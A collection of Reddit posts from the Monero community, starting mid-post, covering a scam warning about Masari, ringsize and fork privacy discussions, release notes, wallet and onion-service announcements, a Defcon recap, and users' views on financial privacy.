* On December 5, 2017 Thaer Kawaja opened a Pull Request to Monero ([\#2887](https://github.com/monero-project/monero/pull/2887)). A consensus-critical change with no clear benefits, it has not been reviewed and retains its DO NOT MERGE tag.
* On March 6, 2018 Fluffypony sent a [tweet](https://twitter.com/fluffypony/status/971103127947669505?lang=en) about Masari's pull request, noting that it may never be merged but encouraging them nonetheless.

Since then, Masari has been running an affinity scam within the Monero community, using a number of suspected [sock puppet](https://twitter.com/BlueTail18) accounts on Reddit and Twitter, claiming ""support and cooperation"" between Masari and Monero, and linking to Fluffypony's tweet for confirmation of that cooperation.  So far, they've tried to be chummy with our [lead maintainer](https://twitter.com/masaricurrency/status/988216632831979520), an [MRL cryptographer](https://twitter.com/masaricurrency/status/982175269149528064), and our [database architect](https://twitter.com/thaerkh/status/1041123656825335808).  They've published [articles](https://steemit.com/cryptocurrency/@gthmr/masari-a-currency-which-can-be-to-monero-what-litecoin-is-to-bitcoin) claiming to be the Litecoin to Monero's bitcoin or better yet, to be to Monero what [Monero is to Bytecoin](https://twitter.com/F0sching/status/1039970587798659072).  They've used their pre-mine to ~~hire~~ pay for an XMR Contributor (u/cryptochangements34) on their ""Core"" team alongside Thaer Kawaja.

Thaer is friendly and agreeable, with an obsequious, yet rambling writing style (as seen in the comments below). He [sidesteps](https://twitter.com/thaerkh/status/1041073221351616512) real questions about the purpose of his project and claims to be working on scaling proposals that would ""likely not"" be approved by the ""Powers that be"" in Monero. No such proposals have been made by him. He channels public conversation into [private chatrooms](https://twitter.com/thaerkh/status/1041003139099316224) (Discord) or [one-on-one](https://twitter.com/thaerkh/status/1041103296675557377) (Skype). He claims to have ""Blocktrees"" on the roadmap for Masari, an idea first proposed by [Howard Chu](https://twitter.com/hyc_symas/status/1041121927841112064) in 2016 on the Monero forum.

Please beware every time you see the name of this project mentioned in this subreddit or on Twitter.  It is likely a sock puppet account running an affinity scam, or someone who has fallen victim to said scam. Tread with caution."
"After seeing this fork: https://monerov.org/ i was toughting to my self that would be fun dump all my airdrop on the market, that was when I tought that this could be a major privacy breaking for me...

Lets think of it.. I will have my addresses in booth chains, that means that when I will try to spend any of my txs in any of that chains I will produce the same key Image... when I will spend the same tx on the other chain you will be able to see that the ring signature to that key image will have the same output and diferent decoys... this is a major privacy breaking"
"We're proud to announce that [LocalMonero](https://localmonero.co) is now available as a Tor single onion service at this address: [http://localmonerogt7be.onion](http://localmonerogt7be.onion)! 

As far as we know we are the only cryptocurrency-related service to implement Tor single onion. The Monero community will appreciate this more than most.

An extra feature of our Tor service as compared to our clearnet service is that it doesn't have any Google Analytics! We're sure this will make a lot of you very happy.

###What's single onion?

Onion services are great because they offer both anonymity on the service and the client side. 

An onion service connection between a client and a service goes through 6 hops, while a regular connection with Tor is 3 hops. Onion services are much slower than regular Tor connections because of this. [Here's a graph illustrating this process.](http://2014.kes.info/archiv/heft/abonnent/07-6/07-6-078-2.jpg)

However, there are cases where the onion service does not require anonymity. The main example of this is when the service provider does not need to hide the location of its servers. This is an issue that Facebook brought to the Tor project and as a result of their collaboration they have developed single onion. 

With single onion, a service specifies that it does not need anonymity, thus cutting the 3 hops between the service and its Rendezvous Point and speeding up the connection while keeping the client anonymous. [Here's a single onion graph.](http://i1-news.softpedia-static.com/images/news2/tor-0-2-9-rolls-out-with-new-shared-randomness-protocol-single-onion-services-511120-3.jpg)

"As most people here should know, the upcoming hardfork in September will bring a larger minimum ringsize. The current minimum, used by most transactions, is currently 3. From some [MRL research](https://lab.getmonero.org/pubs/MRL-0004.pdf) done in January 2015, the minimum was supposed to be raised to 5 this September.

However, RingCT brought some improvements that were not considered in the 2015 paper. It is now less expensive to add additional inputs to a transaction. Whereas the difference in size between a transaction with 5 and 10 inputs used to be very large, it is now very small. This caused the community to reconsider the new minimum, possibly increasing it.

[The discussion on GitHub](https://github.com/monero-project/monero/issues/1673) has been going on since February, with different contributors posting their analysis to come up with the ideal minimum ringsize. Some highlights of the discussion include:

* A better input selection algorithm to reflect realistic use. This will allow the inputs that are chosen to be used more effectively. There is little use increasing the ringsize if the inputs are all poorly chosen. Conversely, a larger ringsize can be very effective if the inputs are chosen well. This dominated a lot of the initial discussion.

* Transaction size is dominated by the number of outputs, meaning a larger ringsize will only increase fees and size marginally.

* EAB and EABE attacks were discussed. This is when someone exchanges with certain people several times under certain circumstances. If people see the same outputs multiple times, it may cause suspicion. A large ringsize does not directly mitigate this attack. Instead, an additional step called ""churning"" is required. The user needs to send money directly from their account back into their account several times to expand their anonymity set. A higher ringsize can allow suspicion to be mitigated with less churning processes. This is still a topic of further discussion, and surae is currently quantifying the threats of this sort of attack. [A community member has proposed this mitigation technique](http://i.imgur.com/n41lhXf.png) which has yet to be thoroughly reviewed (with a minimum ringsize of 10).

* Making a network-wide mandated ringsize, instead of allowing users to choose any number. Most transactions use the minimum instead of the default, and there is little support for extra privacy with larger ringsizes if few other people are doing the same.

At the end of the day, the consensus is settling around a minimum ringsize of 10, up from the original minimum of 5. Furthermore, many people agree that the network should *only* accept transactions with a ringsize 10. It would, for instance, now reject a transaction with ringsize 19.

Larger ringsizes were considered, but there is less of a clear threat to the sender at ringsize 10. An increase from 4 to 10 is much more justified than an increase from 10 to 20, for example.

Anyway, I felt there was a lot of discussion that I wanted to bring more light to on Reddit. Not everyone sees all the background work that goes into a major decision such as this one."
"## Note: This is for 0.10.3.1, but since it was released so soon after 0.10.3.0 this topic has simply been updated and not replaced.

## Overview

This is a necessary point release of Monero v0.10 ""_Wolfram Warptangent_"", and it is a mandatory update due to the April 15th hard fork, which in turn has been necessitated by the unexpectedly high adoption rate of RingCT transactions necessitating a modification of the dynamic block size limiter algorithm.

In addition, this is the first version that aligns CLI and GUI tags, with the CLI being tagged and released first, and the GUI tagged and released within a few days thereafter. This will mean that some point releases in future may be forced by a need on the GUI side, where the CLI may not have substantial changes, and vice versa.

Since it has only been 30 days since the last release, this is something of a ""light"" update. Nonetheless, some highlights of this release are:

- the 0.10.3.1 point release disables a portion of the server-side hash cache that was preventing a small subset of nodes from syncing
- added a feature to allow for multiple outputs to be paid to the same address (unless you have ```set merge-destinations 1```)
- fixed a major bug that could lead to some peers, seemingly randomly, getting stuck at a block height and refusing to accept further blocks
- monero-wallet-cli (and underlying libraries) can now work in a number of units: monero, millinero, micronero, nanonero, piconero
- added OpenAlias support to wallet RPC calls
- fixed hardcoded seed fallback issues when DNS seeds have failed or too few seeds are returned
- added an optional config file for wallets

"Dear Monero Community,

I've been informed that you guys are switching PoW algorithm to resolve ASIC centralization.

At [PascalCoin](https://www.pascalcoin.org), we have developed a LOW-MEMORY and provably GPU/ASIC resistant PoW algorithm called RandomHash. 

The full white-paper is available [here](https://www.pascalcoin.org/storage/whitepapers/RandomHash_Whitepaper.pdf).

1. The core innovation is [mixing nonce calculations](https://github.com/PascalCoin/PascalCoin/raw/master/PIP/resources/PIP-0009/randomhash.png) together. In other words, the evaluation of a nonce requires the partial evaluation of other **random** nonces. This means optimal nonce-set can only be enumerated, and not pre-calculated for batching (i.e. serial mining is always faster than parallel mining).
 
2. CPUs outperform (economically comparative) GPUs [by 300%](https://github.com/polyminer1/rhminer#performances-for-v13)

3. ASICs have been provably [removed](http://46.101.96.95/server/nonce/pascal-randomhash/index.html) NOTE: RandomHash activated from block 260,000. Also, due to high-level nature of algorithm, an ASIC will end up looking like a Celeron processor (if they ever build one). Also, offers huge ASIC-breaking tweak surface.

4. Our community (credits: @polyminer) has developed a [super-optimized](https://github.com/polyminer1/rhminer) implementation with pool integration. It's continuously improving and being invested in. This matters since we had closed-source clones competing at some point, which will be a problem with RandomX.

5. Most IMPORTANTLY, it only requires 5MB to verify a nonce and 10MB to mine. 

**DISCLAIMER**: Yes, I did invent this algorithm so I have a conflict of interest promoting it to a great coin like Monero. However, objectively, it has empirically solved this GPU/ASIC problem (so far) and it's ready to go now.  With XMR investment, the FOSS implementation can be sealed as the standard to eliminate ""closed-source miner attack"" threat.

"It seems like these posts are extremely common - always asking about PIVX, Verge, Dash, ZCash or something else that has been addressed nearly hundreds of times. More supposed privacy coins are showing up, like SpectreCoin, and mentions that ethereum now or will soon have optional Ring signatures and zk-snarks, and bitcoin will have a MW sidechains in the future. 

Would it perhaps be a good strategy to have an automod post a very detailed, with lots of links and resources explanation about why we like Monero over these privacy coins? It could be triggered by the names of those coins in the title and/or text description. 

We could include links to all of the resources on why we prefer Monero because it is a trustless/decentralized, auditable coinbase with default instead of optional privacy, how it is private and has no rich lists, how it works, and all of that.
 
https://moneroforcash.com/monero-vs-dash-vs-zcash-vs-bitcoinmixers.php#verge 

It wouldn't delete the post or anything, but it would quickly quell these redundant conversations in a constructive and informative way. :) 


If this is something the our subreddit would be for or against, I'd like to hear it. 
We can work on developing a nice post via PiratePad.net (Will edit and link to it in this post if we proceed) and then we can get an automod made to post with the trigger words?

"I've been your standard ""bitcoin hater"" for a long time. Just about 100% of my coworkers would give you the typical response of ""bitcoin has no value, but I really like the blockchain"" -- without knowing anything about bitcoin or the blockchain.  I've spent the past month digging into details of the crypto world and here are my thoughts (with the humble caveat that a ""professional investor"" viewpoint is almost certainly no better, and probably often worse, than the general public -- just this is what is preventing the finance world from entering the space -- I think Fintech pools are already here).

The arguments for crypto I usually see are:

Store of value - I see this as very secondary, and this is the main reason no hedge fund invests in crypto. If WW3 breaks out and you need food, would you rather have a gold bar or bitcoin to barter with?  Any physical asset (real estate, metals, commodities) has value storage and moves with inflation. You don't need a crypto to store value. In fact given how easily cryptos are hacked/stolen, I would say it's a very poor/risky store of value Bullets are honestly a better/safer store of value than crypto.

Technology/payments revolution - Ethereum/Ripple seem like really cool technologies but does this give the currency/coin any value? I don't really think so. Paypal is a really cool technology -- does it make USD more valuable? No. Would I buy a Paypal coin if they made one? No. I can already use paypal to pay for the majority of my internet transactions. Why am I going to switch to Ethereum to buy a movie on Amazon? Maybe I'm lacking vision but that seems absurd. Goldman correctly pointed out long ago that if a ledger based system is to succeed it would ideally have a fixed exchange rate. I don't believe the power of Ethereum technology actually gives Ether any value other than in subjecting it to rampant Fintech speculation. If I'm paying online I don't desire to hold the currency I'm paying in, I just want the lowest fees and no volatility.  I'm fairly certain most dark web transactors aren't holding bitcoins for the long haul.

Privacy - This is where I feel cryptocurrencies actually have a unique advantage. Things like tax evasion, money laundering, questionably legal transactions (there is an enormous market/demand for all 3).  Moving your money out of the country securely/secretly to get away from oppressive governments (China). Storing your money secretly to avoid irresponsible governments (Venezuela, Argentina, Zimbabwe, possibly the US in the future). There is real value here so long as the cryptocurrency is truly anonymous and not easily stolen/hacked.

Anyway, please let me know if I'm missing anything as I'm new to the space -- but for the above reasons I see Monero as the strongest contender to actually have staying power (with Bitcoin in 2nd due to ease of availability, head start, and possible privacy add innovations down the road).  I really don't see crypto's having any value at all other than the ability to hide from the government, but I see that ability as potentially extremely valuable."
"Hey there Monero peeps. I wanted to take the time to introduce Decentral, Jaxx (and myself) to the Monero community.

As some of you may know, last week Jaxx became closer involved with your community as we both announced Monero is iOS approved as well as our future plans for XMR wallet support across all 9 platforms that Jaxx supports. iOS mobile & iPad, Android mobile & tablet, Chrome & Firefox extensions and Mac / PC / Linux desktop. 

Jaxx has been in the works for over a year and a half now and officially launched this past June. In a nutshell, the vision for Jaxx is to create a default blockchain interface that's made for the masses (including those non-technical folk like my Dad) that allows everyone to manage and be in full control or their digital assets, and done in a way that brings together and provides support for the global decentralized tech / blockchain communities we admire for providing choice and value to the world. 


To achieve our vision we're shooting to:

* Be chain & platform agnostic - currently 7 tokens & available on 9 different platforms

* Provide a similar experience across every device - need a wallet? d/l Jaxx, no need to find out how the user will be using it first or which platform or device they have

* Offer a simple, single, one-time back system - 12 words you can write down once and can be used to derive all keys for ALL tokens, identity systems, messaging systems we integrate with now and in the future

* Be Extremely lightweight - we're just a few mb, no need to d/l the entire blockchain or even a SPV client

* Allow users to be in full control of their keys & identity & communications - meaning we never want to take custodianship or have access to customer keys or funds, identity etc.

* Be design-led and user experience driven - provide awesome user experiences, ie single screen design with everything you need on the main interface

* Provide hardware support to enhance security - upcoming product Jaxx Ice Cube & support for other hardware solutions

* Never require users to provide ANY personal information (including emails)

* Offer best in industry customer support - targeting 3 hour response times, and personal support via other channels for more delicate situations

* Remove as many friction points as possible - we hate forcing passwords and usernames for starters

* Ensure self-sufficiency by creating our own backend infrastructure for the communities / tokens we're supporting (nodes, relays, apis)

* Ensure self-sufficiency by monetizing via various avenues - as afterall, we are a business first and people need to live, and right now, to live people need to be paid. 

* Offer visible and auditable code why not allowing for easy distribution of cloned maliciously copies of our products - code is available on our website and directly be inspecting the extension and android versions.

* Partner with 3rd parties to allow for direct integrations into Jaxx. ie Shapeshift, Coinbase, many others to come. 

* Avoid situations where we would need to be regulated. ie since we don't hold customer funds or keys we aren't regulated. Meaning we can push off all kyc / aml work to our integration partners and focus on expanding Jaxx globally without worrying about regional rules and compliance.


Decentral is the parent company of Jaxx and is also a decentralized tech hub located in downtown Toronto. We are currently a team of around 20 full-time and contract staff. Decentral opened on New Year's day 2014 to provide a space where enthusiasts of decentralized tech could meet, work, and create cool shit. Since opening we believe Decentral has made some huge strides. We're proud to be the birthplace of The Decentral Project, Ethereum, Kryptokit, Rushwallet, Ethereumwallet.com, Jaxx, Decentral.tv, Decentral Consulting, Cointalk, C4, the world's 2nd Bitcoin ATM & Toronto's first (which is still running strong btw). We're also the first home to the Bitcoin Alliance of Canada, Toronto Ethereum Meetup, Toronto Bitcoin Meetup, & Toronto Techno Crypto. As well, our client list includes Toronto Stock Exchange, RBC Bank, Deloitte and many other small and large enterprise clients and start-ups. 


To date Decentral has hosted over 115 events including The Canadian Bitcoin Expo 2014 at the Metro Toronto Convention Centre & associated Hackathon where Amir Taaki's Dark Market (Open Bazaar) emerged. Along the way we have educated many thousands on the positive and potential benefits blockchain and decentralized technologies provide. We are approachable, visible, and community and business oriented. All traits we recognize to be very important the space we are in, and especially important in the blockchain wallet space, as let's face it, even though we don't ""hold"" customer funds, we are still responsible for the software they rely on to manage said funds, and in the future, we're hoping their entire digital lives. 


Decentral has learned a lot developing wallets over the past 3 years. in 2013 we first emerged as Kryptokit, launching the first ever chrome extension bitcoin wallet. About a month later just as Kryptokit was taking flight, Vitalik Buterin showed be the whitepaper for Ethereum, I dropped everything and spent the next 12 months founding that project, while doing minimal work in the wallet space except for pushing out Rushwallet.com, our html5 bitcoin wallet that works across many different platforms and devices. 


So, how will Jaxx be helping to build our the Monero ecosystem? Aside from XMR wallet support we are also building our also creating the full infrastructure and redundancy systems for tokens we carry. The ultimate plan in the future is for individual users to run and tap into their own nodes should they wish to do so. The more control can be pushed off to the individual / user, and the less you have to rely on us the better, we say.
 

This new Monero infrastructure we're developing, the first part of it which should be deployed when we launch is designed to source data from our multiple nodes as well as any others available. (in a round-robin fashion) and select the best most accurate info to display and use for sending transactions. We're also determining how this infrastructure can be used to assist the entire Monero ecosystem as the complete structure containing nodes, apis, and relay system is unique and unlike anything available right now for Monero. We developed this massive infrastructure project which is and will be available for all our supported tokens because we realized what was currently available (a miss-match of token specific services) wasn't allowing us to add new token support efficiently and synchronously.


Now a bit about myself. I am the CEO and founder of Decentral & Jaxx, co-founder of Ethereum and have lived in Toronto all my life. I've been an entrepreneur and design junkie for 20 years. Prior to full-time blockchain (2012) I owned a geothermal drilling company doing commercial projects for Ikea. I've been in tech all my life building computers since age 8 (1984), on BBSes since the 1200 baud modem days (late 80's), designing website in the early 90's. I invested in Bitcoin (2012), Litecoin (2013) and Ethereum (2013). I currently hold all three as well as Monero and Dash and ETC and am looking to expand my portfolio with some of the new groundbreaking technologies Decentral has been identifying. All projects I've done in this space are self-funded (aside from Ethereum of course, although I did bootstrap a large portion of the project before the crowdsale). I own 100% own my current projects and believe efficiencies and leadership are paramount to providing great products and services for the public. 


Earlier this year I became (part-time) Chief Digital Officer at the Toronto Stock Exchange, (a position I've just resigned from) in order to focus full efforts on Jaxx and the soon to be announced new project. This role at TSX and work with others industry clients has really given myself and Decentral an inside on how the current systems operates. From these engagements we've realized we have an amazing team at Decentral that's able to map out current processes and industries (whether it be municipal services, health care systems, banking infrastructure, etc.) and provide roadmaps for how these systems can be modernized using technologies such as bitcoin and other disruptive (and usually) decentralized tech.


My personal goal it to provide products and choices that enables individuals to take control of their lives. I'm a voluntarist, meaning I believe all interactions between individuals and groups should be voluntary and uncoerced, and believe diplomacy and short-term sacrifices can lead to much greater longer term gains and execution of grand plans. I'm also a huge proponent of privacy and security.


Regarding Jaxx, Jaxx.io is our official site. There you'll find it a great resources ie FAQ and knowledge base and it's also the best way to get support for any of our products. Regarding support, Annie Lee leads that department and will be sure to help you with any tickets submitted once we launch our XMR integration. If you'd like to discuss potential business opportunities or integrations feel free to drop Rico Nassir a line at rico@decentral.ca.


Please always make sure you downloading our products from trusted official app stores or from our SSL locked site [Jaxx](https://www.jaxx.io). We control the distribution of Jaxx tightly as to do our best to ensure there aren't malicious versions floating around the web or on app stores (more about this in a future post)


That's it for now as this has taken up half a Saturday to put together. One last thing I want to mention is how great it is to work with the Decentral and Jaxx team every day in our office in Toronto. We've got some rockstars in the house and nothing beats direct interaction on a daily basis with the team and this is why we are as efficient as we are, and why I believe as we grow we will continue to maintain our efficiencies and continue to push out great products and services. 

Looking forward to working much closer with the Monero community. We've penciled in XMR release for early November. Keep in mind though, ""penciled"".

Cheers!

"Hello all you happy people. It's your friendly rehrar kid. I was the floor manager at the Monero/BCOS village at Defcon and I just wanted to give a brief update from my perspective. I think a few others might do the same from theirs, so look forward to that.

I've had my hands involved in this village through most of the process. The beginning planning portions, to the initial prep work immediately before it started, to doing my best to hold things together and keep stuff running smoothly throughout.

Long story short, the village was a massive success. There were several talks that were filled front to back (standing room only), and we had to station people at the door to not let anyone else in because we were quite over capacity. There was a line to get in. Even when we weren't that jam packed, we were always full. People in the front, people in the back, people at the tables, the chairs, outside, all discussing Monero.

I know I myself had several conversations, got several business cards (and potential interviews from interested tech people, which is exciting), and got many many new people excited about Monero.

There were tons of people who, when given the spiel about why Monero is private, fungible, hard currency, etc, at worst were merely intrigued and said they'd look into it further, and at best got super excited and wanted to get involved. Let's see if any of them pop up around these parts over the coming days.

In fact, if you're reading this and you just learned about Monero at defcon, please introduce yourself. Would love to hear from you all again.

The talks over the three(ish) days were quite well received, the stickers, badges, pamphlets, shirts, and other freebies disappeared like hotcakes, and we all had a great time.

But guys, the best part (for me, at least) was getting to shake hands and bump shoulders with many of the contributors to Monero. Putting faces to names, and hanging out and laughing with you all. If you missed it, I feel sad for you. The sense of camaraderie and family was everywhere. 

A MASSIVE thanks to everyone who came and was involved in some way. To /u/midipoet, /u/endogenic, /u/binaryFate, /u/ArticMine, /u/fluffyponyza, Michael (msvb on IRC), u/anonimal_0x914409F1, /u/SamsungGalaxyPlayer, /u/Xeagu, u/intj440 (you're the real hero here), /u/snoether, /u/SarangNoether, /u/needmoney90, /u/XMR_Snipa (another big hero who deserves massive kudos), /u/hyc_symas, ajs, sneurlax, Tari, Globee, /u/pwrcycle, Tonya, Sean Coughlin (the reason for every season), XMRscott, oneiric, and more and more and more!

Sorry I don't have time to tag everyone right now. Please tag them if you know their reddit names (if they have them). You guys made this thing awesome. 

Here's to next year!"

"I've so many websites trying to make a profit off providing services for injecting miner (conhive or cryptoloot). I already have a system in place, and will be providing the service for 0% commission, unlike other which charge insanely high 12 or 15 %. I don't intend to make a profit off that maybe few dollars donation to keep servers up :). Let's make this better for bigger websites. Let me know what you guys think.

No hidden fees. 

Edit: Some people suggested I would not be able to manage it off donations. They are correct, to an extent. For bigger websites (<10K visitors daily), maybe instead of charging 0% fee, I will charge them per request and resource used, or possibly a flat rate, just to break even, that should not even be 1% however. They, however, could decide to manage if they can host it themselves, they will be provided with the code. All they will pay for is convenience. "

"Before we knew what was going to be included in the current hard-fork, I wanted bulletproofs to be the next immediate thing. I thought that cheaper transactions and smaller blockchain was the way forward to give Monero an even greater edge amongst other coins.

When I saw a few weeks ago that bulletproofs were another 6 months away I was disappointed.

Now with all this botnet mining and the recent 51% attack on Electroneum, I can see that the devs seem to have an eye on what matters and, are being cautious whilst setting in place what matters first.

Does anyone agree?"
"People usually say that you don't really get to understand something until you experience it yourself. About three months ago - just a couple weeks before all the non-stop headlines about Bitcoin price started, a friend of mine told me that I should invest a little bit in cryptocurrencies. So I did. For the next few weeks, I was spending an insane amount of time monitoring price fluctuations and so on. I thought that's what it was all about. 

Luckily, a couple weeks later I came across Andreas Antonopoulos's YouTube channel. As you can guess, this turned into an obsession. I watched all his talks for ""The Internet of Money"" book and several other of his talks (I also read a few whitepapers to understand technical aspects).  It quickly became clear to me that headlines about prices were just a distraction and that the bigger picture was not being given enough attention by the media. Still, I could not relate to this bigger picture on a personal level. I thought the existing (financial) systems were ""okay."" 

A few weeks ago I noticed an opportunity that could have allowed me a significant amount of money in a relatively short period of time (it's not crypto investing and is legal as far as I can tell). After putting all the resources together, I got the ball rolling and money started coming into my bank account. 

My bank, which I won't say the name but know it's one of the biggest in the US, quickly put a ""block"" on my account. From that time, the cash flow stopped because I could not move ""my"" money at all. No wire transfers. No debit card transactions. Nothing. The explanation when I called the bank? ""We're seeing much activity... transfers from many locations ... and these transactions are higher than your typical transactions..."" 

That's the entire explanation. The checking account is currently frozen, and I cannot use ""my"" money. Whenever I reach out in an attempt to remove the ""block,"" I'm told ""we'll get back to you soon."" I've been getting that same response every day for the last FIVE days. Luckily, I don't have a family or other people who rely on me financially. So, the negative consequences have been minimal so far.  

You may wonder why I'm posting this in the Monero subreddit not the r/cryptocurrency. The Monero project understands that privacy is essential. Information such as ""sender"", ""receiver"", ""amount"", ""location/IP address"" should be private BY DEFAULT (the Kovri project is working to address the location part). So, financial privacy isn't necessarily about criminal activities - it's for everyone. You may get that once in a lifetime opportunity, but you probably won't be able to take advantage of it without privacy. If there are people who rely on you, the consequences may be bad not just for you but the people you love and care about. 

In addition to privacy, Monero understands that decentralization is essential. There is no Monero Inc or 10% of coins going to Team/Investors/Advisors... stuff. Whenever there is someone (or group) with uneven influence on the project, the whole project becomes fragile.

I didn't mean to make this post that long... I'm simply saying, let's not focus on the wrong things such as price fluctuations (newcomers like me...) We need cryptocurrencies such as Monero so that we can have a better world. Thank you.

"I wont lie, I don't understand much of the technical discussion around here, but how good to see a cryptocurrency community that isn't interested solely in ""the price went up, the price went down"" type of thing. I feel that your intentions are not simply to get rich overnight, but to create a technology that enriches people's lives.

 Congratulations to all those involved in this project."
"So today i finally get paid for my first mined Moneros, not a super big chunk but still those 0.8 XMR made me really happy. From years i loved to play some card games especially hold' em poker, but those f**kers at the top ruling my country are doing everything to stop me playing (there's a risk i will loose 'their' money of course). So i opened the browser, paid in bitcoin through xmr.to (GREAT service btw, plz keep the good work) and bam! not even a minute and i can hit the poker table not worrying about anything, love this privacy, love this feeling, love this freedom, love Monero. I'm in all the way."
"I check into this sub and /r/xmrtrader pretty much everyday. The question of privacy often comes up in various ways: Why don't people care about privacy? How do I convince my friends/family/dog that privacy is important? How does Monero compare to other privacy coins? Etc. 

I feel like the privacy argument is not quite hitting home, and fungibility under-promoted as a critical feature. I remember going to a crypto meetup a few years where a presenter was promoting Bitcoin ASIC's with the primary benefit being that they would mint ""new and untainted coins"". That Monero cannot be tainted or flagged is a huge thing that I think is undervalued and under promoted. 

I guess my argument is that maybe our messaging is a little bit off.  To the average person who gives away their privacy everyday for the sake of convenience (myself included), a blanket argument for privacy is probably lost. But a practical argument for certain specific benefits of privacy could be very effective. Specifically these two features:

1. Hot Potato\[e\]: The idea that I might get stuck with a tainted or unusable coin is a pretty big thing: Like getting stuck with a counterfeit bill that you can't get rid of.
2. Hidden Account Balances: The other big benefit is that some rando can't see my account balance from looking at my address. This is a huge safety feature for obvious reasons.

I feel like if we focused on those two features no one could counter with the ""nothing to hide"" argument or challenge the value of such a currency. They're low hanging fruit.

Just some opinions I thought I'd present since it's Monday and I don't feel like working. I'm a huge fan of this community and of Monero. With the Monero outreach group set to fire up for another FFS, and the crypto market in general looking like a big dumpster fire, I thought this might be worth something."
